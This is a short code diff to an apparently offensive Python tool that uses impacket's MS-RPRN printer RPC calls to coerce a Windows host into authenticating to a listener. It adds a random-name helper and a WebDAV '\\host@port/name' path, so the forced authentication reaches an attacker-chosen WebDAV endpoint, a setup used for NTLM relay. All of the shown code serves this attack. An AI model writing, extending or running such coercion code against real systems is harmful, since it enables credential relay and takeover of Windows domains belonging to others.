@@ -6,11 +6,21 @@
 
 
 import sys
+import random
 from .RPCProtocol import RPCProtocol, DCERPCSessionError
 from impacket.dcerpc.v5 import transport, rprn
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
 from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+
+
+def gen_random_name(length=8):
+    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    name = ""
+    for k in range(length):
+        name += random.choice(alphabet)
+    return name
+
 
 
 class MS_RPRN(RPCProtocol):
@@ -36,7 +46,10 @@ class MS_RPRN(RPCProtocol):
                     request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
                     request['hPrinter'] = resp['pHandle']
                     request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
-                    request['pszLocalMachine'] = '\\\\%s\x00' % listener
+                    if self.webdav_host is not None and self.webdav_port is not None:
+                        request['pszLocalMachine'] = '\\\\%s@%d/%s\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3))
+                    else:
+                        request['pszLocalMachine'] = '\\\\%s\x00' % listener
                     request['pOptions'] = NULL
                     if self.debug:
                         request.dump()
